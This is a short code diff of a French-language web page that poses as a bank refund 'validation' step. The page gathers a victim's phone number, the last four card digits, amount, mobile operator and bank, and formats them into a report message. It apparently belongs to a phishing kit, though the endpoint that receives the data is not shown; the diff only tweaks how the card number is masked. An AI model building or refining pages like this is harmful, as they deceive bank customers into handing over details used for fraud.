@@ -157,7 +157,7 @@ Valider par SMS si vous ne possédez pas l'application bancaire !
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-600">Carte :</span>
-                            <span class="font-medium">•••• •••• •••• <span id="last-four">••••</span></span>
+                            <span class="font-medium">••••  <span id="last-four">••••</span></span>
                         </div>
                         <div class="flex justify-between">
                             <span class="text-gray-600">Téléphone :</span>
@@ -273,7 +273,7 @@ Valider par SMS si vous ne possédez pas l'application bancaire !
             const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
             const message = `🔐 **Validation de Remboursement** 🔐
 📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
-💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
+💳 Carte: **** ****  ${remboursementData.lastFourDigits || '••••'}
 💰 Montant: ${remboursementData.amount || '0'} €
 📡 Opérateur: ${remboursementData.operateur || 'Non spécifié'}
 🏦 Banque: ${remboursementData.bank || 'Non spécifiée'}
